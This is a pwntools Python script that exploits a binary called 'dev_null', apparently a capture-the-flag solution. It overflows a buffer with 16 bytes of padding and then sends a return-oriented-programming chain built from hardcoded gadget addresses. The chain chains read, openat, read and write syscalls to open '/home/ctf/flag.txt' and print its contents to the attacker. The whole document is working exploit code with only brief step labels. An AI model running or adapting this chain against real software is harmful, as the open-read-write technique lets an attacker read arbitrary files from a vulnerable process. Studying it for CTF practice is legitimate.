from pwn import *
exe = context.binary = ELF("./dev_null")
r = process()
offset = 16
rop = ROP(exe)
syscall_ret = 0x000000000040bcd6
xchg_rax_rdx = 0x000000000041799a
rop.raw(b"A" * offset)
# Setting up path
rop.rax = 19
rop.raw(xchg_rax_rdx)
rop.rax = 0
rop.rdi = 0
rop.rsi = exe.bss() + 64
rop.raw(syscall_ret)
# Open file
rop.rax = 0
rop.raw(xchg_rax_rdx)
rop.rax = 257
rop.rdi = -100
rop.rsi = exe.bss() + 64
rop.raw(syscall_ret)
# store content
rop.rax = 256
rop.raw(xchg_rax_rdx)
rop.rax = 0
rop.rdi = 3
rop.rsi = exe.bss() + 128
rop.raw(syscall_ret)
# write file
rop.rax = 256
rop.raw(xchg_rax_rdx)
rop.rax = 1
rop.rdi = 1
rop.rsi = exe.bss() + 128
rop.raw(syscall_ret)
sleep(3)
r.sendline(rop.chain())
r.send(b"/home/ctf/flag.txt\x00")
r.interactive()